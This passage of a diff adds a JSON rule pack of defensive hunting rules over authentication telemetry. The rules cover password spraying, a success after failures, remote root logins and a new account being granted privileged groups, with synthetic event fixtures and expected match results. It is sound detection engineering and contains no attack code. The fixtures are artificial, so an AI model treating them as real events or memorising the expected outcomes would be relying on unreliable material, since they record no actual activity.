@@ -1,0 +1,4914 @@
+{
+  "schema_version": "0.1.0",
+  "kind": "rule-pack",
+  "pack": {
+    "name": "telemetry-hunting",
+    "version": "1.0.0",
+    "description": "Hunting rules over endpoint telemetry: process relationships, authentication patterns, persistence and snapshot changes. They read telemetry documents, not the assessment."
+  },
+  "rules": [
+    {
+      "id": "DR-ANY-HAUTH-001",
+      "version": "1.0.0",
+      "name": "Many failed logins from one source across several accounts",
+      "description": "One source address had at least 10 failed logins against at least 3 different accounts in the collected events.",
+      "enabled": true,
+      "platforms": [
+        "any"
+      ],
+      "category": "hunt-auth",
+      "severity": "medium",
+      "severity_reason": "Guessing many passwords across accounts is how password spraying and brute force appear in logs.",
+      "confidence": "medium",
+      "confidence_reason": "Counts come from collected events; the window is whatever the collector read, and failures also come from misconfigured clients.",
+      "nature": "indicator",
+      "requires_coverage": [
+        "telemetry:auth_event"
+      ],
+      "clauses": [
+        {
+          "id": "src",
+          "source": "telemetry",
+          "description": "A source with many failures against several accounts",
+          "where": {
+            "all": [
+              {
+                "field": "category",
+                "op": "eq",
+                "value": "auth_summary"
+              },
+              {
+                "field": "attrs.grouping",
+                "op": "eq",
+                "value": "source"
+              },
+              {
+                "field": "attrs.failures",
+                "op": "gte",
+                "value": 10
+              },
+              {
+                "field": "attrs.users_targeted",
+                "op": "gte",
+                "value": 3
+              }
+            ]
+          }
+        }
+      ],
+      "join": {
+        "on": "record_id"
+      },
+      "title": "{src.attrs.failures} failed logins from {src.attrs.source_address} against {src.attrs.users_targeted} accounts",
+      "rationale": "Several accounts failing from a single address in one window is a spraying pattern. The rule does not know whether the address belongs to you; a scanner, a misconfigured monitor, or a user mistyping can look the same.",
+      "false_positives": [
+        "A vulnerability scanner or monitoring probe with stale credentials.",
+        "A misconfigured automation using an old password for several accounts."
+      ],
+      "confidence_boosters": [
+        "A successful login from the same source afterwards.",
+        "Targeted accounts include administrative or default names."
+      ],
+      "investigation": [
+        "Check whether the address is yours (asset inventory, VPN, NAT).",
+        "Look for a success from the same address (DR-ANY-HAUTH-002).",
+        "Block or rate-limit the address at the edge if hostile.",
+        "Check which accounts were targeted and whether they exist."
+      ],
+      "remediation": "Rate-limit or block the source at the network edge and enforce MFA/lockout per policy. This tool does not change the host.",
+      "references": {
+        "attack": [
+          {
+            "id": "T1110.003",
+            "relationship": "possible",
+            "explanation": "The pattern matches password spraying; the data does not prove the intent."
+          },
+          {
+            "id": "T1110",
+            "relationship": "possible",
+            "explanation": "Repeated failures are consistent with guessing; benign causes are common."
+          }
+        ],
+        "nist": [
+          "AC-7",
+          "AU-6",
+          "SI-4"
+        ]
+      },
+      "examples": [
+        {
+          "name": "spray from one address",
+          "expect": "match",
+          "platform": "linux",
+          "telemetry": {
+            "records": [
+              {
+                "category": "auth_event",
+                "key": "e0|2026-03-01T09:00:00Z|login_failure|root|203.0.113.5",
+                "attributes": {
+                  "action": "login_failure",
+                  "result": "failure",
+                  "user": "root",
+                  "source_address": "203.0.113.5",
+                  "service": "sshd"
+                },
+                "event_time": "2026-03-01T09:00:00Z"
+              },
+              {
+                "category": "auth_event",
+                "key": "e1|2026-03-01T09:01:00Z|login_failure|admin|203.0.113.5",
+                "attributes": {
+                  "action": "login_failure",
+                  "result": "failure",
+                  "user": "admin",
+                  "source_address": "203.0.113.5",
+                  "service": "sshd"
+                },
+                "event_time": "2026-03-01T09:01:00Z"
+              },
+              {
+                "category": "auth_event",
+                "key": "e2|2026-03-01T09:02:00Z|login_failure|alice|203.0.113.5",
+                "attributes": {
+                  "action": "login_failure",
+                  "result": "failure",
+                  "user": "alice",
+                  "source_address": "203.0.113.5",
+                  "service": "sshd"
+                },
+                "event_time": "2026-03-01T09:02:00Z"
+              },
+              {
+                "category": "auth_event",
+                "key": "e3|2026-03-01T09:03:00Z|login_failure|bob|203.0.113.5",
+                "attributes": {
+                  "action": "login_failure",
+                  "result": "failure",
+                  "user": "bob",
+                  "source_address": "203.0.113.5",
+                  "service": "sshd"
+                },
+                "event_time": "2026-03-01T09:03:00Z"
+              },
+              {
+                "category": "auth_event",
+                "key": "e4|2026-03-01T09:04:00Z|login_failure|root|203.0.113.5",
+                "attributes": {
+                  "action": "login_failure",
+                  "result": "failure",
+                  "user": "root",
+                  "source_address": "203.0.113.5",
+                  "service": "sshd"
+                },
+                "event_time": "2026-03-01T09:04:00Z"
+              },
+              {
+                "category": "auth_event",
+                "key": "e5|2026-03-01T09:05:00Z|login_failure|admin|203.0.113.5",
+                "attributes": {
+                  "action": "login_failure",
+                  "result": "failure",
+                  "user": "admin",
+                  "source_address": "203.0.113.5",
+                  "service": "sshd"
+                },
+                "event_time": "2026-03-01T09:05:00Z"
+              },
+              {
+                "category": "auth_event",
+                "key": "e6|2026-03-01T09:06:00Z|login_failure|alice|203.0.113.5",
+                "attributes": {
+                  "action": "login_failure",
+                  "result": "failure",
+                  "user": "alice",
+                  "source_address": "203.0.113.5",
+                  "service": "sshd"
+                },
+                "event_time": "2026-03-01T09:06:00Z"
+              },
+              {
+                "category": "auth_event",
+                "key": "e7|2026-03-01T09:07:00Z|login_failure|bob|203.0.113.5",
+                "attributes": {
+                  "action": "login_failure",
+                  "result": "failure",
+                  "user": "bob",
+                  "source_address": "203.0.113.5",
+                  "service": "sshd"
+                },
+                "event_time": "2026-03-01T09:07:00Z"
+              },
+              {
+                "category": "auth_event",
+                "key": "e8|2026-03-01T09:08:00Z|login_failure|root|203.0.113.5",
+                "attributes": {
+                  "action": "login_failure",
+                  "result": "failure",
+                  "user": "root",
+                  "source_address": "203.0.113.5",
+                  "service": "sshd"
+                },
+                "event_time": "2026-03-01T09:08:00Z"
+              },
+              {
+                "category": "auth_event",
+                "key": "e9|2026-03-01T09:09:00Z|login_failure|admin|203.0.113.5",
+                "attributes": {
+                  "action": "login_failure",
+                  "result": "failure",
+                  "user": "admin",
+                  "source_address": "203.0.113.5",
+                  "service": "sshd"
+                },
+                "event_time": "2026-03-01T09:09:00Z"
+              },
+              {
+                "category": "auth_event",
+                "key": "e10|2026-03-01T09:10:00Z|login_failure|alice|203.0.113.5",
+                "attributes": {
+                  "action": "login_failure",
+                  "result": "failure",
+                  "user": "alice",
+                  "source_address": "203.0.113.5",
+                  "service": "sshd"
+                },
+                "event_time": "2026-03-01T09:10:00Z"
+              },
+              {
+                "category": "auth_event",
+                "key": "e11|2026-03-01T09:11:00Z|login_failure|bob|203.0.113.5",
+                "attributes": {
+                  "action": "login_failure",
+                  "result": "failure",
+                  "user": "bob",
+                  "source_address": "203.0.113.5",
+                  "service": "sshd"
+                },
+                "event_time": "2026-03-01T09:11:00Z"
+              }
+            ]
+          },
+          "count": 1
+        },
+        {
+          "name": "many failures against one account",
+          "expect": "no_match",
+          "platform": "linux",
+          "telemetry": {
+            "records": [
+              {
+                "category": "auth_event",
+                "key": "e0|2026-03-01T09:00:00Z|login_failure|root|203.0.113.5",
+                "attributes": {
+                  "action": "login_failure",
+                  "result": "failure",
+                  "user": "root",
+                  "source_address": "203.0.113.5",
+                  "service": "sshd"
+                },
+                "event_time": "2026-03-01T09:00:00Z"
+              },
+              {
+                "category": "auth_event",
+                "key": "e1|2026-03-01T09:01:00Z|login_failure|root|203.0.113.5",
+                "attributes": {
+                  "action": "login_failure",
+                  "result": "failure",
+                  "user": "root",
+                  "source_address": "203.0.113.5",
+                  "service": "sshd"
+                },
+                "event_time": "2026-03-01T09:01:00Z"
+              },
+              {
+                "category": "auth_event",
+                "key": "e2|2026-03-01T09:02:00Z|login_failure|root|203.0.113.5",
+                "attributes": {
+                  "action": "login_failure",
+                  "result": "failure",
+                  "user": "root",
+                  "source_address": "203.0.113.5",
+                  "service": "sshd"
+                },
+                "event_time": "2026-03-01T09:02:00Z"
+              },
+              {
+                "category": "auth_event",
+                "key": "e3|2026-03-01T09:03:00Z|login_failure|root|203.0.113.5",
+                "attributes": {
+                  "action": "login_failure",
+                  "result": "failure",
+                  "user": "root",
+                  "source_address": "203.0.113.5",
+                  "service": "sshd"
+                },
+                "event_time": "2026-03-01T09:03:00Z"
+              },
+              {
+                "category": "auth_event",
+                "key": "e4|2026-03-01T09:04:00Z|login_failure|root|203.0.113.5",
+                "attributes": {
+                  "action": "login_failure",
+                  "result": "failure",
+                  "user": "root",
+                  "source_address": "203.0.113.5",
+                  "service": "sshd"
+                },
+                "event_time": "2026-03-01T09:04:00Z"
+              },
+              {
+                "category": "auth_event",
+                "key": "e5|2026-03-01T09:05:00Z|login_failure|root|203.0.113.5",
+                "attributes": {
+                  "action": "login_failure",
+                  "result": "failure",
+                  "user": "root",
+                  "source_address": "203.0.113.5",
+                  "service": "sshd"
+                },
+                "event_time": "2026-03-01T09:05:00Z"
+              },
+              {
+                "category": "auth_event",
+                "key": "e6|2026-03-01T09:06:00Z|login_failure|root|203.0.113.5",
+                "attributes": {
+                  "action": "login_failure",
+                  "result": "failure",
+                  "user": "root",
+                  "source_address": "203.0.113.5",
+                  "service": "sshd"
+                },
+                "event_time": "2026-03-01T09:06:00Z"
+              },
+              {
+                "category": "auth_event",
+                "key": "e7|2026-03-01T09:07:00Z|login_failure|root|203.0.113.5",
+                "attributes": {
+                  "action": "login_failure",
+                  "result": "failure",
+                  "user": "root",
+                  "source_address": "203.0.113.5",
+                  "service": "sshd"
+                },
+                "event_time": "2026-03-01T09:07:00Z"
+              },
+              {
+                "category": "auth_event",
+                "key": "e8|2026-03-01T09:08:00Z|login_failure|root|203.0.113.5",
+                "attributes": {
+                  "action": "login_failure",
+                  "result": "failure",
+                  "user": "root",
+                  "source_address": "203.0.113.5",
+                  "service": "sshd"
+                },
+                "event_time": "2026-03-01T09:08:00Z"
+              },
+              {
+                "category": "auth_event",
+                "key": "e9|2026-03-01T09:09:00Z|login_failure|root|203.0.113.5",
+                "attributes": {
+                  "action": "login_failure",
+                  "result": "failure",
+                  "user": "root",
+                  "source_address": "203.0.113.5",
+                  "service": "sshd"
+                },
+                "event_time": "2026-03-01T09:09:00Z"
+              },
+              {
+                "category": "auth_event",
+                "key": "e10|2026-03-01T09:10:00Z|login_failure|root|203.0.113.5",
+                "attributes": {
+                  "action": "login_failure",
+                  "result": "failure",
+                  "user": "root",
+                  "source_address": "203.0.113.5",
+                  "service": "sshd"
+                },
+                "event_time": "2026-03-01T09:10:00Z"
+              },
+              {
+                "category": "auth_event",
+                "key": "e11|2026-03-01T09:11:00Z|login_failure|root|203.0.113.5",
+                "attributes": {
+                  "action": "login_failure",
+                  "result": "failure",
+                  "user": "root",
+                  "source_address": "203.0.113.5",
+                  "service": "sshd"
+                },
+                "event_time": "2026-03-01T09:11:00Z"
+              }
+            ]
+          }
+        },
+        {
+          "name": "few failures",
+          "expect": "no_match",
+          "platform": "linux",
+          "telemetry": {
+            "records": [
+              {
+                "category": "auth_event",
+                "key": "e1|2026-03-01T09:00:00Z|login_failure|root|203.0.113.5",
+                "attributes": {
+                  "action": "login_failure",
+                  "result": "failure",
+                  "user": "root",
+                  "source_address": "203.0.113.5",
+                  "service": "sshd"
+                },
+                "event_time": "2026-03-01T09:00:00Z"
+              }
+            ]
+          }
+        },
+        {
+          "name": "auth events unavailable",
+          "expect": "indeterminate",
+          "platform": "linux",
+          "telemetry": {
+            "records": [
+              {
+                "category": "process",
+                "key": "pid:1",
+                "attributes": {
+                  "pid": 1,
+                  "ppid": 0,
+                  "name": "init",
+                  "exe": "/usr/bin/init",
+                  "user": "root",
+                  "cmdline": "init"
+                }
+              }
+            ],
+            "coverage": {
+              "auth_event": "unavailable"
+            }
+          }
+        }
+      ]
+    },
+    {
+      "id": "DR-ANY-HAUTH-002",
+      "version": "1.0.0",
+      "name": "Successful login after repeated failures from the same source",
+      "description": "A source had at least 5 failed logins and later a successful one in the collected events.",
+      "enabled": true,
+      "platforms": [
+        "any"
+      ],
+      "category": "hunt-auth",
+      "severity": "high",
+      "severity_reason": "A success following a run of failures is the pattern of a guessed credential.",
+      "confidence": "medium",
+      "confidence_reason": "Event order comes from the collected timestamps; users legitimately mistype passwords before succeeding.",
+      "nature": "indicator",
+      "requires_coverage": [
+        "telemetry:auth_event"
+      ],
+      "clauses": [
+        {
+          "id": "src",
+          "source": "telemetry",
+          "description": "A source whose success followed repeated failures",
+          "where": {
+            "all": [
+              {
+                "field": "category",
+                "op": "eq",
+                "value": "auth_summary"
+              },
+              {
+                "field": "attrs.grouping",
+                "op": "eq",
+                "value": "source"
+              },
+              {
+                "field": "attrs.failures",
+                "op": "gte",
+                "value": 5
+              },
+              {
+                "field": "attrs.successes",
+                "op": "gte",
+                "value": 1
+              },
+              {
+                "field": "attrs.success_after_failure",
+                "op": "is_true"
+              }
+            ]
+          }
+        }
+      ],
+      "join": {
+        "on": "record_id"
+      },
+      "title": "Login succeeded from {src.attrs.source_address} after {src.attrs.failures} failures",
+      "rationale": "A burst of failures followed by a success is how a successful guess looks in logs. Because users also fail repeatedly before getting it right, the rule needs the number of failures and the source to be unusual.",
+      "false_positives": [
+        "A user who forgot their password and then recalled it.",
+        "Automation retrying with a rotating credential."
+      ],
+      "confidence_boosters": [
+        "Followed by privileged actions (sudo, new accounts).",
+        "Source has no earlier successful history."
+      ],
+      "investigation": [
+        "List the accounts that succeeded and what they did next (sessions, sudo, new processes).",
+        "Confirm with the account owner whether it was them.",
+        "Check the source address against known user locations."
+      ],
+      "remediation": "If the login was not the account owner, reset the credential, end its sessions and review what it did per your incident process. This tool does not change the host.",
+      "references": {
+        "attack": [
+          {
+            "id": "T1110",
+            "relationship": "possible",
+            "explanation": "A success after many failures is consistent with a guessed credential; it does not prove one."
+          },
+          {
+            "id": "T1078",
+            "relationship": "possible",
+            "explanation": "A valid account was used; whether by its owner is not established."
+          }
+        ],
+        "nist": [
+          "AC-7",
+          "AU-6",
+          "IA-5"
+        ]
+      },
+      "examples": [
+        {
+          "name": "success after failures",
+          "expect": "match",
+          "platform": "linux",
+          "telemetry": {
+            "records": [
+              {
+                "category": "auth_event",
+                "key": "e0|2026-03-01T09:00:00Z|login_failure|alice|203.0.113.5",
+                "attributes": {
+                  "action": "login_failure",
+                  "result": "failure",
+                  "user": "alice",
+                  "source_address": "203.0.113.5",
+                  "service": "sshd"
+                },
+                "event_time": "2026-03-01T09:00:00Z"
+              },
+              {
+                "category": "auth_event",
+                "key": "e1|2026-03-01T09:01:00Z|login_failure|alice|203.0.113.5",
+                "attributes": {
+                  "action": "login_failure",
+                  "result": "failure",
+                  "user": "alice",
+                  "source_address": "203.0.113.5",
+                  "service": "sshd"
+                },
+                "event_time": "2026-03-01T09:01:00Z"
+              },
+              {
+                "category": "auth_event",
+                "key": "e2|2026-03-01T09:02:00Z|login_failure|alice|203.0.113.5",
+                "attributes": {
+                  "action": "login_failure",
+                  "result": "failure",
+                  "user": "alice",
+                  "source_address": "203.0.113.5",
+                  "service": "sshd"
+                },
+                "event_time": "2026-03-01T09:02:00Z"
+              },
+              {
+                "category": "auth_event",
+                "key": "e3|2026-03-01T09:03:00Z|login_failure|alice|203.0.113.5",
+                "attributes": {
+                  "action": "login_failure",
+                  "result": "failure",
+                  "user": "alice",
+                  "source_address": "203.0.113.5",
+                  "service": "sshd"
+                },
+                "event_time": "2026-03-01T09:03:00Z"
+              },
+              {
+                "category": "auth_event",
+                "key": "e4|2026-03-01T09:04:00Z|login_failure|alice|203.0.113.5",
+                "attributes": {
+                  "action": "login_failure",
+                  "result": "failure",
+                  "user": "alice",
+                  "source_address": "203.0.113.5",
+                  "service": "sshd"
+                },
+                "event_time": "2026-03-01T09:04:00Z"
+              },
+              {
+                "category": "auth_event",
+                "key": "e5|2026-03-01T09:05:00Z|login_failure|alice|203.0.113.5",
+                "attributes": {
+                  "action": "login_failure",
+                  "result": "failure",
+                  "user": "alice",
+                  "source_address": "203.0.113.5",
+                  "service": "sshd"
+                },
+                "event_time": "2026-03-01T09:05:00Z"
+              },
+              {
+                "category": "auth_event",
+                "key": "e99|2026-03-01T09:30:00Z|login_success|alice|203.0.113.5",
+                "attributes": {
+                  "action": "login_success",
+                  "result": "success",
+                  "user": "alice",
+                  "source_address": "203.0.113.5",
+                  "service": "sshd"
+                },
+                "event_time": "2026-03-01T09:30:00Z"
+              }
+            ]
+          },
+          "count": 1
+        },
+        {
+          "name": "success before the failures",
+          "expect": "no_match",
+          "platform": "linux",
+          "telemetry": {
+            "records": [
+              {
+                "category": "auth_event",
+                "key": "e99|2026-03-01T08:00:00Z|login_success|alice|203.0.113.5",
+                "attributes": {
+                  "action": "login_success",
+                  "result": "success",
+                  "user": "alice",
+                  "source_address": "203.0.113.5",
+                  "service": "sshd"
+                },
+                "event_time": "2026-03-01T08:00:00Z"
+              },
+              {
+                "category": "auth_event",
+                "key": "e0|2026-03-01T09:00:00Z|login_failure|alice|203.0.113.5",
+                "attributes": {
+                  "action": "login_failure",
+                  "result": "failure",
+                  "user": "alice",
+                  "source_address": "203.0.113.5",
+                  "service": "sshd"
+                },
+                "event_time": "2026-03-01T09:00:00Z"
+              },
+              {
+                "category": "auth_event",
+                "key": "e1|2026-03-01T09:01:00Z|login_failure|alice|203.0.113.5",
+                "attributes": {
+                  "action": "login_failure",
+                  "result": "failure",
+                  "user": "alice",
+                  "source_address": "203.0.113.5",
+                  "service": "sshd"
+                },
+                "event_time": "2026-03-01T09:01:00Z"
+              },
+              {
+                "category": "auth_event",
+                "key": "e2|2026-03-01T09:02:00Z|login_failure|alice|203.0.113.5",
+                "attributes": {
+                  "action": "login_failure",
+                  "result": "failure",
+                  "user": "alice",
+                  "source_address": "203.0.113.5",
+                  "service": "sshd"
+                },
+                "event_time": "2026-03-01T09:02:00Z"
+              },
+              {
+                "category": "auth_event",
+                "key": "e3|2026-03-01T09:03:00Z|login_failure|alice|203.0.113.5",
+                "attributes": {
+                  "action": "login_failure",
+                  "result": "failure",
+                  "user": "alice",
+                  "source_address": "203.0.113.5",
+                  "service": "sshd"
+                },
+                "event_time": "2026-03-01T09:03:00Z"
+              },
+              {
+                "category": "auth_event",
+                "key": "e4|2026-03-01T09:04:00Z|login_failure|alice|203.0.113.5",
+                "attributes": {
+                  "action": "login_failure",
+                  "result": "failure",
+                  "user": "alice",
+                  "source_address": "203.0.113.5",
+                  "service": "sshd"
+                },
+                "event_time": "2026-03-01T09:04:00Z"
+              },
+              {
+                "category": "auth_event",
+                "key": "e5|2026-03-01T09:05:00Z|login_failure|alice|203.0.113.5",
+                "attributes": {
+                  "action": "login_failure",
+                  "result": "failure",
+                  "user": "alice",
+                  "source_address": "203.0.113.5",
+                  "service": "sshd"
+                },
+                "event_time": "2026-03-01T09:05:00Z"
+              }
+            ]
+          }
+        },
+        {
+          "name": "failures only",
+          "expect": "no_match",
+          "platform": "linux",
+          "telemetry": {
+            "records": [
+              {
+                "category": "auth_event",
+                "key": "e0|2026-03-01T09:00:00Z|login_failure|alice|203.0.113.5",
+                "attributes": {
+                  "action": "login_failure",
+                  "result": "failure",
+                  "user": "alice",
+                  "source_address": "203.0.113.5",
+                  "service": "sshd"
+                },
+                "event_time": "2026-03-01T09:00:00Z"
+              },
+              {
+                "category": "auth_event",
+                "key": "e1|2026-03-01T09:01:00Z|login_failure|alice|203.0.113.5",
+                "attributes": {
+                  "action": "login_failure",
+                  "result": "failure",
+                  "user": "alice",
+                  "source_address": "203.0.113.5",
+                  "service": "sshd"
+                },
+                "event_time": "2026-03-01T09:01:00Z"
+              },
+              {
+                "category": "auth_event",
+                "key": "e2|2026-03-01T09:02:00Z|login_failure|alice|203.0.113.5",
+                "attributes": {
+                  "action": "login_failure",
+                  "result": "failure",
+                  "user": "alice",
+                  "source_address": "203.0.113.5",
+                  "service": "sshd"
+                },
+                "event_time": "2026-03-01T09:02:00Z"
+              },
+              {
+                "category": "auth_event",
+                "key": "e3|2026-03-01T09:03:00Z|login_failure|alice|203.0.113.5",
+                "attributes": {
+                  "action": "login_failure",
+                  "result": "failure",
+                  "user": "alice",
+                  "source_address": "203.0.113.5",
+                  "service": "sshd"
+                },
+                "event_time": "2026-03-01T09:03:00Z"
+              },
+              {
+                "category": "auth_event",
+                "key": "e4|2026-03-01T09:04:00Z|login_failure|alice|203.0.113.5",
+                "attributes": {
+                  "action": "login_failure",
+                  "result": "failure",
+                  "user": "alice",
+                  "source_address": "203.0.113.5",
+                  "service": "sshd"
+                },
+                "event_time": "2026-03-01T09:04:00Z"
+              },
+              {
+                "category": "auth_event",
+                "key": "e5|2026-03-01T09:05:00Z|login_failure|alice|203.0.113.5",
+                "attributes": {
+                  "action": "login_failure",
+                  "result": "failure",
+                  "user": "alice",
+                  "source_address": "203.0.113.5",
+                  "service": "sshd"
+                },
+                "event_time": "2026-03-01T09:05:00Z"
+              }
+            ]
+          }
+        },
+        {
+          "name": "no event times so order is unknown",
+          "expect": "no_match",
+          "platform": "linux",
+          "telemetry": {
+            "records": [
+              {
+                "category": "auth_event",
+                "key": "e0|None|login_failure|alice|203.0.113.5",
+                "attributes": {
+                  "action": "login_failure",
+                  "result": "failure",
+                  "user": "alice",
+                  "source_address": "203.0.113.5",
+                  "service": "sshd"
+                },
+                "event_time": null
+              },
+              {
+                "category": "auth_event",
+                "key": "e1|None|login_failure|alice|203.0.113.5",
+                "attributes": {
+                  "action": "login_failure",
+                  "result": "failure",
+                  "user": "alice",
+                  "source_address": "203.0.113.5",
+                  "service": "sshd"
+                },
+                "event_time": null
+              },
+              {
+                "category": "auth_event",
+                "key": "e2|None|login_failure|alice|203.0.113.5",
+                "attributes": {
+                  "action": "login_failure",
+                  "result": "failure",
+                  "user": "alice",
+                  "source_address": "203.0.113.5",
+                  "service": "sshd"
+                },
+                "event_time": null
+              },
+              {
+                "category": "auth_event",
+                "key": "e3|None|login_failure|alice|203.0.113.5",
+                "attributes": {
+                  "action": "login_failure",
+                  "result": "failure",
+                  "user": "alice",
+                  "source_address": "203.0.113.5",
+                  "service": "sshd"
+                },
+                "event_time": null
+              },
+              {
+                "category": "auth_event",
+                "key": "e4|None|login_failure|alice|203.0.113.5",
+                "attributes": {
+                  "action": "login_failure",
+                  "result": "failure",
+                  "user": "alice",
+                  "source_address": "203.0.113.5",
+                  "service": "sshd"
+                },
+                "event_time": null
+              },
+              {
+                "category": "auth_event",
+                "key": "e5|None|login_failure|alice|203.0.113.5",
+                "attributes": {
+                  "action": "login_failure",
+                  "result": "failure",
+                  "user": "alice",
+                  "source_address": "203.0.113.5",
+                  "service": "sshd"
+                },
+                "event_time": null
+              },
+              {
+                "category": "auth_event",
+                "key": "e99|None|login_success|alice|203.0.113.5",
+                "attributes": {
+                  "action": "login_success",
+                  "result": "success",
+                  "user": "alice",
+                  "source_address": "203.0.113.5",
+                  "service": "sshd"
+                },
+                "event_time": null
+              }
+            ]
+          }
+        }
+      ]
+    },
+    {
+      "id": "DR-ANY-HAUTH-003",
+      "version": "1.0.0",
+      "name": "Remote login to a built-in administrative account",
+      "description": "A successful login as root or Administrator came from a non-local address.",
+      "enabled": true,
+      "platforms": [
+        "any"
+      ],
+      "category": "hunt-auth",
+      "severity": "medium",
+      "severity_reason": "Direct logins to the most privileged account bypass per-user accountability and are a prime target.",
+      "confidence": "low",
+      "confidence_reason": "It may be sanctioned practice in small environments; policy decides.",
+      "nature": "observation",
+      "requires_coverage": [
+        "telemetry:auth_event"
+      ],
+      "clauses": [
+        {
+          "id": "login",
+          "source": "telemetry",
+          "description": "A successful remote login to an administrative account",
+          "where": {
+            "all": [
+              {
+                "field": "category",
+                "op": "eq",
+                "value": "auth_event"
+              },
+              {
+                "field": "attrs.action",
+                "op": "eq",
+                "value": "login_success"
+              },
+              {
+                "any": [
+                  {
+                    "field": "attrs.user",
+                    "op": "ieq",
+                    "value": "root"
+                  },
+                  {
+                    "field": "attrs.user",
+                    "op": "ieq",
+                    "value": "administrator"
+                  }
+                ]
+              },
+              {
+                "field": "attrs.source_address",
+                "op": "present"
+              },
+              {
+                "not": {
+                  "field": "attrs.source_address",
+                  "op": "in",
+                  "value": [
+                    "127.0.0.1",
+                    "::1",
+                    "-",
+                    "localhost"
+                  ]
+                }
+              }
+            ]
+          }
+        }
+      ],
+      "join": {
+        "on": "record_id"
+      },
+      "title": "{login.attrs.user} logged in from {login.attrs.source_address}",
+      "rationale": "A direct remote login to root or Administrator is unusual in hardened environments, where administrators use named accounts and elevate. It is an observation about practice, not a sign of compromise.",
+      "false_positives": [
+        "Break-glass access during maintenance.",
+        "Small systems where root login is the practice."
+      ],
+      "confidence_boosters": [
+        "Outside business hours.",
+        "Followed by configuration changes."
+      ],
+      "investigation": [
+        "Confirm whether direct administrative logins are allowed here.",
+        "Verify the source address and time with the administrator.",
+        "Prefer named accounts with privilege elevation."
+      ],
+      "remediation": "Disable direct administrative remote login if policy forbids it. This tool does not change the host.",
+      "references": {
+        "attack": [
+          {
+            "id": "T1078.003",
+            "relationship": "possible",
+            "explanation": "A local privileged account was used; whether by its owner is not established."
+          }
+        ],
+        "nist": [
+          "AC-6",
+          "AC-2",
+          "AU-6"
+        ]
+      },
+      "examples": [
+        {
+          "name": "remote root login",
+          "expect": "match",
+          "platform": "linux",
+          "telemetry": {
+            "records": [
+              {
+                "category": "auth_event",
+                "key": "e1|2026-03-01T09:00:00Z|login_success|root|203.0.113.5",
+                "attributes": {
+                  "action": "login_success",
+                  "result": "success",
+                  "user": "root",
+                  "source_address": "203.0.113.5",
+                  "service": "sshd"
+                },
+                "event_time": "2026-03-01T09:00:00Z"
+              }
+            ]
+          },
+          "count": 1
+        },
+        {
+          "name": "local console root",
+          "expect": "no_match",
+          "platform": "linux",
+          "telemetry": {
+            "records": [
+              {
+                "category": "auth_event",
+                "key": "e1|2026-03-01T09:00:00Z|login_success|root|127.0.0.1",
+                "attributes": {
+                  "action": "login_success",
+                  "result": "success",
+                  "user": "root",
+                  "source_address": "127.0.0.1",
+                  "service": "sshd"
+                },
+                "event_time": "2026-03-01T09:00:00Z"
+              }
+            ]
+          }
+        },
+        {
+          "name": "remote ordinary user",
+          "expect": "no_match",
+          "platform": "linux",
+          "telemetry": {
+            "records": [
+              {
+                "category": "auth_event",
+                "key": "e1|2026-03-01T09:00:00Z|login_success|alice|203.0.113.5",
+                "attributes": {
+                  "action": "login_success",
+                  "result": "success",
+                  "user": "alice",
+                  "source_address": "203.0.113.5",
+                  "service": "sshd"
+                },
+                "event_time": "2026-03-01T09:00:00Z"
+              }
+            ]
+          }
+        }
+      ]
+    },
+    {
+      "id": "DR-ANY-HAUTH-004",
+      "version": "1.0.0",
+      "name": "Account created and added to a privileged group in the same period",
+      "description": "Events show a new account and a privileged-group addition for the same account.",
+      "enabled": true,
+      "platforms": [
+        "any"
+      ],
+      "category": "hunt-auth",
+      "severity": "high",
+      "severity_reason": "Creating an account and immediately granting administrative rights is how persistent access is often established.",
+      "confidence": "medium",
+      "confidence_reason": "Both events are observed and joined by account name; onboarding does the same.",
+      "nature": "correlated",
+      "requires_coverage": [
+        "telemetry:auth_event"
+      ],
+      "clauses": [
+        {
+          "id": "new",
+          "source": "telemetry",
+          "description": "An account creation event",
+          "where": {
+            "all": [
+              {
+                "field": "category",
+                "op": "eq",
+                "value": "auth_event"
+              },
+              {
+                "field": "attrs.action",
+                "op": "eq",
+                "value": "account_change"
+              },
+              {
+                "field": "attrs.change",
+                "op": "eq",
+                "value": "created"
+              }
+            ]
+          }
+        },
+        {
+          "id": "grp",
+          "source": "telemetry",
+          "description": "An addition to a privileged group",
+          "where": {
+            "all": [
+              {
+                "field": "category",
+                "op": "eq",
+                "value": "auth_event"
+              },
+              {
+                "field": "attrs.action",
+                "op": "eq",
+                "value": "group_change"
+              },
+              {
+                "field": "attrs.change",
+                "op": "eq",
+                "value": "member_added"
+              },
+              {
+                "field": "attrs.group",
+                "op": "in",
+                "value": [
+                  "sudo",
+                  "wheel",
+                  "admin",
+                  "root",
+                  "adm",
+                  "administrators",
+                  "domain admins",
+                  "remote desktop users"
+                ]
+              }
+            ]
+          }
+        }
+      ],
+      "join": {
+        "on": "attrs.user"
+      },
+      "title": "Account {new.attrs.user} created and added to {grp.attrs.group}",
+      "rationale": "A new account that is promptly privileged is a standard persistence step, and it is also what a legitimate administrator does when onboarding someone. The actor and change records decide which.",
+      "false_positives": [
+        "Planned onboarding of an administrator."
+      ],
+      "confidence_boosters": [
+        "The actor is an unexpected account or a service.",
+        "The account has logged in from a new source."
+      ],
+      "investigation": [
+        "Find who performed the change (actor, session, source address).",
+        "Check for a ticket or request for the account.",
+        "Review what the new account did since.",
+        "Compare the account list with the last snapshot."
+      ],
+      "remediation": "If unauthorised, disable the account (do not delete it, it is evidence), remove the membership and review the actor's session per your incident process. This tool does not change the host.",
+      "references": {
+        "attack": [
+          {
+            "id": "T1136.001",
+            "relationship": "possible",
+            "explanation": "A local account was created; whether it is unauthorised is not established."
+          },
+          {
+            "id": "T1098",
+            "relationship": "possible",
+            "explanation": "Group membership was changed; the intent is not established."
+          }
+        ],
+        "nist": [
+          "AC-2",
+          "AC-6",
+          "AU-6"
+        ]
+      },
+      "examples": [
+        {
+          "name": "create then add to sudo",
+          "expect": "match",
+          "platform": "linux",
+          "telemetry": {
+            "records": [
+              {
+                "category": "auth_event",
+                "key": "e1|2026-03-01T09:00:00Z|account_change|backdoor|",
+                "attributes": {
+                  "action": "account_change",
+                  "result": "success",
+                  "user": "backdoor",
+                  "source_address": null,
+                  "service": "sshd",
+                  "change": "created"
+                },
+                "event_time": "2026-03-01T09:00:00Z"
+              },
+              {
+                "category": "auth_event",
+                "key": "e2|2026-03-01T09:00:05Z|group_change|backdoor|",
+                "attributes": {
+                  "action": "group_change",
+                  "result": "success",
+                  "user": "backdoor",
+                  "source_address": null,
+                  "service": "sshd",
+                  "change": "member_added",
+                  "group": "sudo"
+                },
+                "event_time": "2026-03-01T09:00:05Z"
+              }
+            ]
+          },
